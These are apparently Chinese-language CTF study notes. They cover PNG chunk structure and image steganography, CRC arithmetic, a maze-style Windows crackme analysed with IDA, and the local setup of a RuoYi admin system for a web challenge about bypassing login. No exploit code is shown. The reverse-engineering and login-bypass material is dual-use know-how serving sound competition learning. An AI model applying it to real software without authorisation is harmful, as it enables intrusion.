
# 🚩 CTF PNG 文件隐写术
- https://github.com/ReFirmLabs/binwalk
- http://www.libpng.org/pub/png/libpng-manual.txt
- BinWalk安装和命令参数详解 https://cloud.tencent.com/developer/article/1515285
- PNG Reference Library: libpng https://libpng.sourceforge.io/index.html
- PNG Specification: File Structure http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html
- CRC Algorithm http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html#CRC-algorithm
- A Painless Guide to CRC Error Detection Algorithms Ross Williams 1993 https://www.zlib.net/crc_v3.txt

隐写是一种信息加密技术，古罗马古典主义诗人奥维德提出用新鲜牛奶在信上书写，不会留下痕迹，之后再沾上煤的灰烬，便能读取信的内容。将秘密信息通过可公开的载体进行传递，且不被第三方发现，这就是“隐写术” Steganography，来源于特里特米乌斯的一本讲述密码学与隐写术的著作 Steganographia，该书名来源于古希腊词汇 stegons 和 graphia 即“隐秘书写”。

隐写术是隐藏信息的一种技术，它和加密的区别就在于，对加密而言，第三方是知道数据被加密的，只是不知道加密前数据是什么样，隐写术则侧重于让人无法察觉数据的存在性。

人眼对数字图像的某些区域并不敏感，图像中若只发生微小的变化，仅凭人眼很难区分，这种特性被称为人类视觉有限性，嵌入图像的隐写术正是利用了这一特性。绝大多数的文本、图像、密文或其他任何形式的媒体都可以生成比特流嵌入到数字图像中。

通过音频也可以实现隐写，一般藏有摩斯电码，将信息与音频混合在一起。

常用工具：

- Winhex 二进制文件编辑工具；
- Stegsolve 
- Binwalk 多重进二进文件扫描工具；
- dd 二进制文件读写命令；

以 PNG 文件为例，结合 libpng 库的源代码解析，源代码根目录下有一个 example.c 示范程序，演示了 PNG 文件的读写。

PNG 文件开头是一个 8 字节的签名，包含 “PNG” 字符标记：

    png_byte png_signature[8] = {137, 80, 78, 71, 13, 10, 26, 10};

```sh
seg000:0000000000000000                 db 89h
seg000:0000000000000001 aPng            db 'PNG',0Dh,0Ah
seg000:0000000000000006                 db 1Ah
seg000:0000000000000007                 db 0Ah
```

一般读取 PNG 图像，先需要通过文件签名确定是一个 PNG 文件，然后，紧跟着初始化 png_struct 和 png_info 两个结构体，png_struct 是关于 PNG 文件及其相关属性的结构，并不直接访问，只是用于 libpng API 内部的信息传递。

需要注意，PNG 采用 MSB First 高位先行 Most Significant Bit，也称为 network byte order，PNG 文件中所有超过 1 个字节的数据，高位字节放在前面，即 Big Endian 字节序。与之相对的是低位先行 LSB Frist，Least Significant Bit。


后面的数据按照特定结构组织，包含 3 个以上的数据块组成(Chunk layout)。参考 PNG 格式规范文档第二章，Data Representation 描述了文件结构。

PNG 定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。

关键数据块有 4 种，每个 PNG 文件都必须包含它们，PNG 读写软件也都必须要支持这些数据块。虽然 PNG 文件规范没有要求 PNG 编译码器对可选数据块进行编码和译码，但规范提倡支持可选数据块。

参考 PNG 格式规范文档罗列的块定义：

- 4.1. Critical chunks
    - IHDR Image header
    - PLTE Palette
    - IDAT Image data
    - IEND Image trailer
- 4.2. Ancillary chunks
    - Transparency information
        - tRNS Transparency
    - Color space information
        - gAMA Image gamma
        - cHRM Primary chromaticities
        - sRGB Standard RGB color space
        - iCCP Embedded ICC profile
    - Textual information
        - tEXt Textual data
        - zTXt Compressed textual data
        - iTXt International textual data
    - Miscellaneous information
        - bKGD Background color
        - pHYs Physical pixel dimensions
        - sBIT Significant bits
        - sPLT Suggested palette
        - hIST Palette histogram
        - tIME Image last-modification time

PNG 文件数据块的结构 Chunk layout：

    |    名称    | 字节数 |                           说明                           |
    |------------|--------|----------------------------------------------------------|
    | Length     | 4字节  | Chunk Data 的长度                                        |
    | Chunk Type | 4字节  | 数据块类型由 4 个 ASCII 字母指定                         |
    | Chunk Data | 变长   | 存储按照 Chunk Type 指定的数据                           |
    | CRC        | 4字节  | Cyclic Redundancy Check 循环冗余校验码用来检测是否有错误 |

数据块的名字包含 4 个字符，大小写不同具有不同意义，如 BLOB 和 bLOb 具有不同功能，对于一个 8-bit 的字符，bit 5 控制大小写，如 A 01000001 和 a 01100001。

那么这四个字符的大小写意义如下：

    | Ancillary bit    | bit 5 of first byte  | 0 = critical, 1 = ancillary.                          |
    | Private bit      | bit 5 of second byte | 0 = public, 1 = private.                              |
    | Reserved bit     | bit 5 of third byte  | Must be 0 in files conforming to this version of PNG. |
    | Safe-to-copy bit | bit 5 of fourth byte | 0 = unsafe to copy, 1 = safe to copy.                 |

例如，块类型名称 bLOb 具有以下属性位：

   bLOb  <-- 32 bit chunk type code represented in text form
   ||||
   |||+- Safe-to-copy bit is 1 (lowercase letter; bit 5 is 1)
   ||+-- Reserved bit is 0     (uppercase letter; bit 5 is 0)
   |+--- Private bit is 0      (uppercase letter; bit 5 is 0)
   +---- Ancillary bit is 1    (lowercase letter; bit 5 is 1)

PNG 格式定义的 4 个关键数据块：

- IHDR (header chunk)：文件头数据块包含 PNG 文件中存储的图像数据的基本信息，并要作为第一个数据块出现在 PNG 数据流中，全文件唯一。
- PLTE (palette chunk)：调色板数据块包含索引彩色图像相关的彩色变换数据，而且要放在图像数据块之前。
- IDAT (image data chunk)：图像数据块存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。
- IEND (image trailer chunk)：图像结束数据标记 PNG 文件或者数据流已经结束，必须要放在文件的尾部。

参考 libpng 头文件定义：

```cpp
/* Convenience macros. */
#define CHUNK(a,b,c,d) (((a)<<24)+((b)<<16)+((c)<<8)+(d))
#define CHUNK_IHDR CHUNK(73,72,68,82)
#define CHUNK_PLTE CHUNK(80,76,84,69)
#define CHUNK_IDAT CHUNK(73,68,65,84)
#define CHUNK_IEND CHUNK(73,69,78,68)
#define CHUNK_cHRM CHUNK(99,72,82,77)
#define CHUNK_gAMA CHUNK(103,65,77,65)
#define CHUNK_sBIT CHUNK(115,66,73,84)
#define CHUNK_sRGB CHUNK(115,82,71,66)

#define png_IDAT PNG_U32( 73,  68,  65,  84)
#define png_IEND PNG_U32( 73,  69,  78,  68)
#define png_IHDR PNG_U32( 73,  72,  68,  82)
#define png_PLTE PNG_U32( 80,  76,  84,  69)
```

除了表示数据块开始的 IHDR 必须放在最前面， 表示 PNG 文件结束的 IEND 数据块放在最后面之外，其他数据块的存放顺序没有限制。

索引彩色图像 indexed-color image，是一种节省存储空间的格式，对于那些色彩数量有限的图像，通过调色板保存色彩值，而像素保存一个索引值，显示图像时通过索引值获取在调板中的彩色。调板表项数目有 256 个，每个调板项保存一个 3 字节的色彩值，因此调色板数据块最大为 768 字节。

真彩色 PNG 数据流也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。

PNG 关键数据块、辅助数据块和专用公共数据块(special-purpose public chunks)综合：

    | 数据块符号 |               数据块名称               | 多数据块 | 可选否 |        位置限制        |
    |------------|----------------------------------------|----------|--------|------------------------|
    | IHDR       | 文件头数据块                           | 否       | 否     | 第一块                 |
    | PLTE       | 调色板数据块                           | 否       | 是     | 在 IDAT 之前           |
    | IDAT       | 图像数据块                             | 是       | 否     | 与其他 IDAT 连续         |
    | IEND       | 图像结束数据                           | 否       | 否     | 最后一个数据块         |
    | cHRM       | primary chromaticities and white point | 否       | 是     | 在 PLTE 和 IDAT 之前   |
    | gAMA       | 图像 γ 数据块 image gamma              | 否       | 是     | 在 PLTE 和 IDAT 之前   |
    | sBIT       | 样本有效位数据块 significant bits      | 否       | 是     | 在 PLTE 和 IDAT 之前   |
    | bKGD       | 背景颜色数据块 background color        | 否       | 是     | 在 PLTE 之后 IDAT 之前 |
    | hIST       | 图像直方图数据块 image histogram       | 否       | 是     | 在 PLTE 之后 IDAT 之前 |
    | tRNS       | 图像透明数据块 transparency            | 否       | 是     | 在 PLTE 之后 IDAT 之前 |
    | oFFs       | 专用公共数据块                         | 否       | 是     | 在 IDAT 之前           |
    | pHYs       | physical pixel dimensions              | 否       | 是     | 在 IDAT 之前           |
    | sCAL       | 专用公共数据块                         | 否       | 是     | 在 IDAT 之前           |
    | tIME       | image last-modification time           | 否       | 是     | 无限制                 |
    | tEXt       | 文本信息数据块 textual data            | 是       | 是     | 无限制                 |
    | zTXt       | 压缩文本数据块 compressed textual data | 是       | 是     | 无限制                 |
    | fRAc       | 专用公共数据块                         | 是       | 是     | 无限制                 |
    | gIFg       | 专用公共数据块                         | 是       | 是     | 无限制                 |
    | gIFt       | 专用公共数据块                         | 是       | 是     | 无限制                 |
    | gIFx       | 专用公共数据块                         | 是       | 是     | 无限制                 |

tEXt 和 zTXt 数据块中的标准关键字：

- `Title` 图像名称或者标题
- `Author` 图像作者名
- `Description` 图像说明
- `Copyright` 版权声明
- `CreationTime` 原图创作时间
- `Software` 创作图像使用的软件
- `Disclaimer` 弃权
- `Warning` 图像内容警告
- `Source` 创作图像使用的设备
- `Comment` 各种注释

IHDR 块作者最重要的数据块，是 PNG 文件处理的第一个数据块，它的结构如下，结合 Chunk layout 定义就是 IHDR 在 PNG 文件出现的样子：

```cpp
typedef unsigned char      uint8_t;
typedef unsigned int       uint32_t;

typedef struct sIHDR {
    uint32_t Width;             // 4 bytes
    uint32_t Height;            // 4 bytes
    uint8_t  BitDepth;          // 1 byte
    uint8_t  ColorType;         // 1 byte
    uint8_t  CompressionMethod; // 1 byte
    uint8_t  FilterMethod;      // 1 byte
    uint8_t  InterlaceMethod;   // 1 byte
} IHDR;

typedef struct sChunkIHDR {
    uint32_t Length;
    uint32_t ChunkType;
    IHDR ChunkData_IHDR;
    uint32_t CRC;
} ChunkIHDR;
```

Color Type 字节根据比特位设置决定 PNG 图像像素使用什么色彩以及色彩深度：


   | Type | Allowed Bit Depths |                         Interpretation                         |
   |------|--------------------|----------------------------------------------------------------|
   |    0 | 1,2,4,8,16         | Each pixel is a grayscale sample.                              |
   |    2 | 8,16               | Each pixel is an R,G,B triple.                                 |
   |    3 | 1,2,4,8            | Each pixel is a palette index; a PLTE chunk must appear.       |
   |    4 | 8,16               | Each pixel is a grayscale sample, followed by an alpha sample. |
   |    6 | 8,16               | Each pixel is an R,G,B triple, followed by an alpha sample.    |

- bit 0 置位表示使用调板；
- bit 1 置位表示使用色彩值；
- bit 2 置位表示使用 alpha channel；

对于一个 IHDR 数据块，ChunkIHDR.Length 为 0DH 即 13 个字节，整个 ChunkIHDR 为 25 个字节。

因为 PNG 使用 MSB Frist，使用 IDA 分析二进制文件时需要选择 Big Endian 类型的 CPU 才能正确显示数据。

示范使用 PNG 隐写 MPEG 视频，例子：日本综艺《あざとくて何が悪いの》 有点心机又如何 https://www.nfmovies.com/video/57933-0-12.html

```rust
00000000:  8950 4e47 0d0a 1a0a 0000 000d 4948 4452 0000 0001 0000 0001  :.PNG........IHDR........
00000018:  0806 0000 001f 15c4 8900 0000 0173 5247 4200 aece 1ce9 0000  :.............sRGB.......
00000030:  0004 6741 4d41 0000 b18f 0bfc 6105 0000 0009 7048 5973 0000  :..gAMA......a.....pHYs..
00000048:  1274 0000 1274 01de 661f 7800 0000 0d49 4441 5418 5763 f8ff  :.t...t..f.x....IDAT.Wc..
00000060:  ffff 7f00 09fb 03fd 0543 45ca 0000 0000 4945 4e44 ae42 6082  :.........CE.....IEND.B`.
00000078:  4740 1110 0042 f025 0001 c100 00ff 01ff 0001 fc80 1448 1201  :G@...B.%.............H..
00000090:  0646 466d 7065 6709 5365 7276 6963 6530 3177 7c43 caff ffff  :.FFmpeg.Service01w|C....
```

从数据可以看到，IHDR 定义了一个 1x1 像素的图片，IEND 结束数据块在 0x77 位置，后面的是视频数据。从视频格式的头部来看，并不是 mp4 这类常规格式，可以猜测是流格式，它确实是常用的 MPEG2-TS 即 Transport Stream 格式。

可以使用 dd 命令进行 PNG 剥离：

    for VAR in `ls .`
    do
        echo $VAR
        dd bs=1 skip=119 if=$VAR of=$VAR.ts
    done


## ⚡ CRC - Cyclic Redundancy Check 校验码
- 高等数学·上册: 第七版 同济大学数学系 https://book4you.org/book/5589738/691ece
- 高等数学 第六版 同济大学数学系 https://book4you.org/book/4997322/0ec23c
- Contemporary Abstract Algebra Joseph A. Gallian https://book4you.org/book/3374622/f78616
- Advanced Modern Algebra Joseph J. Rotman https://book4you.org/book/439766/a9d5bc
- 【高等代数】 04 - 多项式环 https://www.cnblogs.com/edward-bian/p/12846742.html
- The art of computer programming. Vol.2. Seminumerical algorithms Knuth, Donald E https://book4you.org/book/2715013/77e0d4
- PNG CRC Algorithm http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html#CRC-algorithm
- A Painless Guide to CRC Error Detection Algorithms Ross Williams 1993 https://www.zlib.net/crc_v3.txt

为了确保数据正确性，PNG 采用了复杂度、纠错等性能优于校验和 CheckSum 或奇偶校验 Parity Check 等校验方式的 CRC(cyclic redundancy check) 校验码。

纵向冗余校验（Longitudinal Redundancy Check，LRC）是对奇偶校验的纵向扩展形式，其只能检测纵向奇数个错误。逐字节奇偶校验计算，将数据字的所有字节进行 XOR，创建一个字节的结果，也称为 XOR 校验和。

最简单的 CheckSum 是对数据的值进行求和，但是寄存器的比特宽度有限，进位超出的值就忽略。

例如以下一个信息传递过程中，数据出现错误，就会导致 CheckSum 与数据不一致。当然，校验码在传递的过程出现错误也一样有问题：

    Message                    :  6 23  4
    Message with checksum      :  6 23  4 33
    Message after transmission :  6 27  4 33

但是校验和的最大问题类似于奇偶校验，对数据的改变不够敏感。

设计冗余码的原则就是：用最小的代价，检测（纠正）最多的错误。

评价较验方法的指标：

- WIDTH: 寄存器的宽度，要有足够的 bit 来容错。
- CHAOS: 一个求值公式，要有足够的随机，输入数据要尽可能影响到寄存器的所有 bit。

以 CRC 的算法为例，XOR 是 CRC 的基本算法。CRC 计算原理就是将输入比特流当作一个巨大的数，作为被除数去除一个值，然后得到一个余数。将这个余数附加在原始数据末尾，使得它可以被整除，这段附加的冗余码就是所谓的 CRC 校验码。输入比特流看作多项式的系数，设定一个多项式作为除数。发送方需要在数据流末尾加上 CRC 冗余码，使得组合后的新数据流能够整除。接收方对数据做除法计算余数，如果余数不为 0，就说明有错误发生。

如何设计多项式，就是除数的选择是非常有讲究的，如果你的多项式选择很愚蠢，那么很可能你的检查范围可能只在最后几位。

CRC 具有线性的性质，适合用来“对抗自然”，即排除随机干扰，但并不适合防御恶意的人为修改。所以 CRC 被用于通信，而不是网络安全领域。

输入数据 bit 大于寄存器，那么需要对 XOR 的逻辑运算进行扩展。

例如，普通的除法 1599/173 得到余数是 2：

              ...0000010101101 = 00AD =  173 = QUOTIENT
             ____-___-___-___-
    9= 1001 ) 0000011000010111 = 0617 = 1559 = DIVIDEND
    DIVISOR   000001100..,.,,,
                   1001..,.,,,
                   ====..,.,,,
                    0110.,.,,,
                     1001,.,,,
                     ====,.,,,
                       1110,,,
                       1001,,,
                       ====,,,
                        1011,,
                        1001,,
                        ====,,
                          1011
                          1001
                          ====
                          0010 = 02 = 2 = REMAINDER

尽管输入消息的每一位对商的影响并不是那么显著，但在计算过程中，4 位的余数会受到很大的影响，如果向消息中添加更多的字节，即被除数有一点改变，余数可能会发生根本性的变化，这就是为什么除法在加法不起作用的地方起作用。

CRC 使用的除法与普通的十进制除法不同，它是模 2 除法，polynomial arithmetic mod 2。基于有限域 GF(2) 的多项式环，即除以 2 同余的多项式环。

忘记除法涉及的概念，现在用多项式的角度来看一个数，假设，一个数 23 对应二进制 10111，它的多项式表达如下：

```sh
# polynomial of 10111
1*x^4 + 0*x^3 + 1*x^2 + 1*x^1 + 1*x^0
# or, more simply:
x^4 + x^2 + x^1 + x^0
```

利用这样抽象的方法，我们可以把要处理的信息数据即被除数，还有除数、商、余数的各个 bit 都看出是多项式的系数。

以下演示用多项式计算 1101 与 1011 相乘：

    (x^3 + x^2 + x^0)(x^3 + x^1 + x^0)
    = (x^6 + x^4 + x^3
     + x^5 + x^3 + x^2
     + x^3 + x^1 + x^0) = x^6 + x^5 + x^4 + 3*x^3 + x^2 + x^1 + x^0

为了得到正确答案，接下来就需要假设 x 是 2，这样就会在 `3*x^3` 这里产生进位，得到：

    = x^7 + x^3 + x^2 + x^1 + x^0

因为二进制不能表示系数中的 3，并且也不能表示 2，这使其它项也发生进位。

这只是平常的算术运算，除了底数是抽象的，运算还是显式的。这有什么意义？

关键是，假设不知道 x 是什么，就不能执行进位，那么 `3*x^3` 和 `x^4 + x^3` 一样。

在真实的多项式运算中，系数间的关系是未知的，需要强调每个幂级的系数，`x^2` 和 `x^3` 的系数是完全不同的类型。

通过把各个幂级的系数相互隔离开来，数学家们通过改变系数作用，想出了各种各样的的多项式运算规则。这些规则中的一种，与主题很有关系，它就是多项式系数模 2 除法运算，即所有的系数通过对 2 取模获得，所有的系数非 0 即 1，不考虑进位，舍弃进位。

如果按通常的多项式运算规则，`3*x^3` 会在二进制产生进位，而在 "polynomial
arithmetic mod 2" 算法中，前面的运算将得到以下结果，所有系数进行 Mod 2 运算不考虑进位：

    = x^6 + x^5 + x^4 + x^3 + x^2 + x^1 + x^0

因此，CRC 中采用的多项式算术就是没有进位的模 2 二进制算术。这种算法进行数值的加减，就是 XOR 运算。

        10011011        10011011
       +11001010       -11001010
        --------        --------
        01010001        01010001
        --------        --------

引用高德纳 The Art of Computer Programming (TAOCP) Volume 2 - 4.6. Polynomial Arithmetic:

>   "The reader should note the similarity between polynomial
>   arithmetic and multiple-precision arithmetic (Section 4.3.1), where
>   the radix b is substituted for x. The chief difference is that the
>   coefficient u_k of x^k in polynomial arithmetic bears little or no
>   relation to its neighboring coefficients x^{k-1} [and x^{k+1}], so
>   the idea of "carrying" from one place to another is absent. In fact
>   polynomial arithmetic modulo b is essentially identical to multiple
>   precision arithmetic with radix b, except that all carries are
>   suppressed."

有了前面的 CRC 加减运算，就可以进行 CRC 乘除运算，乘法相当多次加法，除法相当于多次减法且可能有一个余数：

        1101
      x 1011
        ----
        1101
       1101.
      0000..
     1101...
     -------
     1111111  Note: The sum uses CRC addition
     -------

If a number A is a multiple of B then what this means in CRC
arithmetic is that it is possible to construct A from zero by XORing
in various shifts of B. For example, if A was 0111010110 and B was 11,
we could construct A from B as follows:

                  0111010110
                = .......11.
                + ....11....
                + ...11.....
                  .11.......

However, if A is 0111010111, it is not possible to construct it out of
various shifts of B (can you see why? - see later) so it is said to be
not divisible by B in CRC arithmetic.

Thus we see that CRC arithmetic is primarily about XORing particular
values at various shifting offsets.


以下演示一个 4-bit 寄存器宽度的 CRC 运算，多项式有 5 项，最高位省略，最高次数指定了寄存器的宽度。

    Original message                : 1101011011
    Poly                            :      10011
    Message after appending W zeros : 11010110110000
    Message after appending CRC     : 11010110111110

现在给输入数据补上后缀 0000 即寄存器宽度的零值，并进行 CRC 除法运算求余数：

                1100001010 = Quotient (nobody cares about the quotient)
           _______________
    10011 ) 11010110110000 = Augmented message (1101011011 + 0000)
    =Poly   10011,,.,,....
            -----,,.,,....
             10011,.,,....
             10011,.,,....
             -----,.,,....
              000010110...
                  10011...
                  -----...
                   010100.
                    10011.
                    -----.
                      1110 = Remainder = THE CHECKSUM!!!!

结果得到的商没有用途，丢弃，余数作为 CRC 校验码附加于数据后面。

接收方校验数据有两种选择：

- 将信息与校验码分离，并按寄存器宽度后缀 0，再计算余数进行比对；
- 直接 CRC 除法运算，结果为零表示数据无误。

经典 CRC 算法步骤：

- 选择一个 W 宽度的多项式 G；
- 后缀相应宽度的 “0" 到数据末端，得到 M；
- 用 M 除以 G，使用 CRC 算法，求得余数作为校验码附加于数据末端发送给接收方。

简单的算法流程如下，将数据当作 bit 流处理可以避免使用除法，以首字节的 most significant bit(MSB) 即最高比特位开始：

       Load the register with zero bits.
       Augment the message by appending W zero bits to the end of it.
       While (more message bits)
          Begin
          Shift the register left by one bit, reading the next bit of the
             augmented message into register bit position 0.
          If (a 1 bit popped out of the register during step 3)
             Register = Register XOR Poly.
          End
       The register now contains the remainder.

CRC 实际计算通常采用预计算表实现，Table-Driven Implementations，查表大大加快了计算速度。CRC 通常可能是用硬件移位寄存器实现的，在软件实现中，也常习惯用寄存器表示。

PNG 图片的 CRC 码是对 Chunk Type 和 Chunk Data 计算得到的，CRC-32 算法定义在 ISO 3309 和 ITU-T V.42，其值按下面的多项式进行计算：

    x^32 + x^26 + x^23 + x^22 + x^16 + x^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x + 1

    0x104C11DB7

32-bit 的 CRC 寄存器初始化为全 1，然后从最低有效位到最高有效位处理每个字节的数据。处理完所有的数据字节后，CRC 寄存器值按位反转。此值按 MSB First 传输存储在文件中。为了分成字节和排序，CRC 的最低有效位被定义为 x^31 项的系数。

以 CRC-16 为例， CRC-16 码由两个字节构成，在开始时 CRC 寄存器的每一位都预置为 1，然后按以下步骤操作：

- 把 CRC 寄存器与 8-bit 的数据进行异或 XOR；
- 对 CRC 寄存器从高到低进行移位，最高位 MSB 补零；
- 被移出 CRC 寄存器的最低位 LSB 如果为 1，则将寄存器与预定义的多项式进行异或；
- 重复由高至低的移位操作 8 次，第一个 8-bit 数据处理完毕；
- 再将 CRC 寄存器的值与下一个 8-bit 数据异或，并重复前面的操作，所有的数据处理完成后，CRC 寄存器内的值即为最终值。

CRC-16 使用的多项式与对应值：

    x^16 + x^15 + x^2 + 1

    0X18005

```cpp
unsigned short crc16(unsigned short crc, unsigned char *p, int len)
{
    while (len--)
       crc = (crc >> 8) ^ crctab[(crc ^ *p++) & 0xff];
    return crc;
}
```




# 🚩 CTF 夺旗赛
- 看雪 CTF https://ctf.pediy.com/
- 看雪 CTF 题库 https://ctf.pediy.com/itembank.htm
- 看雪 CTF 2019 https://ctf.pediy.com/game-details-10.htm
- 看雪 2016CrackMe 攻防大赛 https://ctf.pediy.com/game-list-1.htm
- XCTF 联赛 https://www.xctf.org.cn/xctf/2020/
- Information Security with HelmetJS https://www.freecodecamp.org/learn/information-security/#information-security-with-helmetjs

CTF - Capture The Flag 本来是西方的一种传统运动。在比赛上两军会互相争夺旗帜，当有一方的旗帜已被敌军夺取，就代表了那一方的战败。

信息安全领域的 CTF 是说，通过各种攻击手法，获取服务器后寻找指定的字段，或者文件中某一个固定格式的字段，这个字段叫做 flag，其形式一般为 flag{xxxxxxxx}，提交到裁判机就可以得分。

看雪 CTF 是圈内知名度最高的技术竞技之一，从原 CrackMe 攻防大赛中发展而来，采取线上 PK 的方式，规则设置严格周全，题目涵盖 Windows、Android、iOS、Pwn、智能设备、Web 等众多领域。   

看雪 CTF 比赛分为两个阶段：

- 第一阶段是防守篇，防守方根据比赛要求制作题目，根据题目被破解的时间排名，被破解时间长者胜出。
- 第二阶段为攻击篇，攻击第一阶段的题目，根据攻击成功的时间与题目排名，破解时间短且破解题目数多者胜。

既给了防守方足够的施展空间，也避免过度浪费攻击方的时间。从攻防两个角度看，都是个难得的竞技和学习机会。

自 2007 年以来，看雪已经举办十多个比赛，与包括金山、腾讯安全、腾讯 TSRC、360、阿里、京东、WiFi 万能钥匙、安恒等在内的各大公司共同合作举办赛事。比赛吸引了国内一大批安全人士的广泛关注，历年来 CTF 中人才辈出，汇聚了来自国内众多安全人才，高手对决，精彩异常，成为安全圈的一次比赛盛宴，突出了看雪论坛复合型人才多的优势，成为企业挑选人才的重要途径，在社会安全事业发展中产生了巨大的影响力。


## ⚡2021KCTF 春季赛 Q1
- 看雪.深信服 KCTF 2021 春季赛! https://ctf.pediy.com/game-season_fight-170.htm

看雪.深信服 2021KCTF 春季赛 第二题 签到题 拜师学艺


## ⚡2021KCTF 春季赛 Q2
- 看雪.深信服 KCTF 2021 春季赛! https://ctf.pediy.com/game-season_fight-171.htm
- https://ctf.pediy.com/game-season_fight-171.htm
- https://bbs.pediy.com/thread-267477.htm
- https://bbs.pediy.com/thread-267478.htm

看雪.深信服 2021KCTF 春季赛 第二题 南冥神功


题目说明：

此题是一道 Windows 逆向题，若序列号有多解，平台不认可提交的注册码，请加比赛专用QQ群：8601428，联系管理员验证。

先将 Windows 32-bit 程序定位到 main 函数, 004B3CC0。

使用 IDA 进行分析，环境（IDA Pro 7.5, Python 3.8)，能自动定位到入口函数很方便，接下来就需要分析代码逻辑。

    sub_4AF840((int)&dword_4B8860, "Input your code: ");

注意，IDA Freeware 7.6 免费版本不只支持程序的 C 语言伪代码生成，符号分析能力不及 IDA Pro，这时可能需要根据提示字符内容所有的内存来间接定位。

可以使用 OllyDbg 1.1，这是免费又好用的 32-bit 逆向调试工具。

此题应该属于迷宫类的题目。要求是从开始处走遍预定的路径，且走过的路径点不能重复走，相邻两次的位置行和列的变化均不能超过1格。每个输入字符可以走迷宫两步。思路是通过找到迷宫路径，然后反推输入，最后得到 flag。

迷宫是 9 * 10 的，使用 VSCode 或 Sublime 带有高亮的编辑器，很容易对象 00 值的走向：

    53 00 01 00 00 01 00 00 01 01
    01 01 00 00 01 00 00 01 00 00
    00 00 01 00 01 01 01 01 01 00
    00 01 01 00 01 00 00 01 00 00
    00 00 01 00 00 01 00 00 01 01
    01 01 00 01 01 01 00 01 00 01
    00 00 01 01 01 01 00 01 00 01
    00 01 01 00 00 01 00 01 00 01
    00 00 00 01 00 00 01 01 00 00

根据奇、偶行，各设置 6 种走向，按 NEWS 方位表示：

     5  0           5  0
      \ |           | /
    4 - O - 1   4 - E - 1
      / |           | \
     3  2           3   2

也就是以下约束规则：

- 偶数行 E 不可向左上及左下寻路；
- 奇数行 O 不可向右上及右下寻路；

将迷宫路径的走向转换成相应的数字，并按以下规则对应输入的字符串，每输入一个字符对应迷宫中走两步。

    nStep1 = 5 - (nHexIdx + nInputIdx) % 6;
    nStep2 = (nInputIdx + nHexIdx / 6) % 6;


## ⚡2021KCTF 春季赛 Q3
- 看雪.深信服 KCTF 2021 春季赛! https://ctf.pediy.com/game-season_fight-172.htm
- 2021 KCTF-WEB 出题思路 https://bbs.pediy.com/thread-267374.htm
- RuoYi 文档 https://doc.ruoyi.vip/ruoyi-vue/document/hjbs.html
- [Downloading Apache Maven 3.6.3](http://maven.apache.org/download.cgi)
- Web 端口安全测绘工具 Goby https://gobies.org/


看雪.深信服 2021KCTF 春季赛 第三题 统一门派

题目描述：

一道 Web 题，访问链接： http://121.36.145.157/

利用技术绕过限制，登陆后台获得 flag 的值。

注意：第一次打开时，网站提示“正在加载系统资源，请耐心等待”，时间有些长，估计要2-3分钟，第二次就正常了，请耐心等待。

打开界面可知是采用“若依管理系统”搭建的一个默认网站，查看若依的官方文档可知：

- 前端采用 Vue、Element UI。
- 后端采用 Spring Boot、Spring Security、Redis & Jwt。
- 权限认证使用 Jwt，支持多终端认证系统。

这道题目需要一定的 Java 项目经验，需要分析开源项目代码。

克隆项目代码：

    git clone https://gitee.com/y_project/RuoYi-Vue.git

环境部署要求：

- JDK >= 1.8 (推荐1.8版本)
- Mysql >= 5.7.0 (推荐5.7版本)
- Redis >= 3.0
- Maven >= 3.0
- Node >= 10 (前端子项目 rouyi-ui 使用)

项目使用 Maven 项目管理工具，需要安装它并在工程根目录下执行编译、打包命令：

- **mvn compile** 编译命令生成 target 文件夹，里面就是编译后的内容。
- **mvn clean** 清除命令主要是清除编译后产生的 target 文件夹。
- **mvn package** 打包命令会将项目默认打成 jar 包，当然也可以打成 war 包。
- **mvn install** 安装命令可以把项目打成 jar，放到本地仓库。

编译器会按子项目依赖关系逐次编译子项目，最后打包生成 ruoyi-admin.jar 后端程序。

打开项目后端 ruoyi-admin 运行 com.ruoyi.RuoYiApplication.java，后端运行成功可以访问 http://localhost:8080 但是不会出现静态页面，可以继续参考下面步骤部署 ruoyi-ui 前端，然后通过前端地址来访问。

项目提供的启动脚本 ry.sh 是 Linux 环境下使用的，在 Windows 系统上，可以执行以下命令启动，忽略 JVM 参数配置：

    set AppName=ruoyi-admin.jar
    set AppPath=ruoyi-admin/target/ruoyi-admin.jar

    set JVM_OPTS="-Dname=$AppName  -Duser.timezone=Asia/Shanghai -Xms512M -Xmx512M -XX:PermSize=256M -XX:MaxPermSize=512M -XX:+HeapDumpOnOutOfMemoryError -XX:+PrintGCDateStamps  -XX:+PrintGCDetails -XX:NewRatio=1 -XX:SurvivorRatio=30 -XX:+UseParallelGC -XX:+UseParallelOldGC"

    java -jar %JVM_OPTS% %AppPath%

启动前，需要安装好 MySQL 数据服务及 Redis 服务，分别使用默认 3306/6379 端口。

创建 MySQL 数据库 `ry-vue` 并导入数据脚本 ry_2021xxxx.sql，quartz.sql，注意数据库名字使用了连字符：

    create database `ry-vue`;

脚本执行有两种方式，一种是使用 source 读入文件，另一种是在命令行中使得管道，将脚本一行行导入执行：

    mysql> source path\to\file_name.sql
    mysql> \. path\to\file_name.sql

注意修改 ruoyi-admin\target\classes\application-druid.yml 配置文件中的 MySQL 账户及密码，注意，配置在 JAR 打包后修改可能无法生效。因为 Maven 打包时会将配置文件一并打包到 BOOT-INF 内，可以使用 WinRAR 覆盖配置文件。

或者使用 jar 命令解包配置文件，更新后再打包回去：

    jar -xf ruoyi-admin.jar BOOT-INF\classes\application-druid.yml
    jar -uf ruoyi-admin.jar BOOT-INF\classes\application-druid.yml

安装 Nginx 并配置前端静态文件和后端 API 服务，根据 ruoyi-ui 编译设置 prod-api 或 stage-api，另外不要随便设置 NGINX 环境变量：

    location / {
        root   /home/ruoyi/projects/ruoyi-ui;
        try_files $uri $uri/ /index.html;
        index  index.html index.htm;
    }
    
    location /prod-api/{
        proxy_set_header Host $http_host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header REMOTE-HOST $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass http://localhost:8080/;
    }

成功配置后端可以尝试访问：

    >curl http://localhost:8080
    {"msg":"请求访问：/，认证失败，无法访问系统资源","code":401}

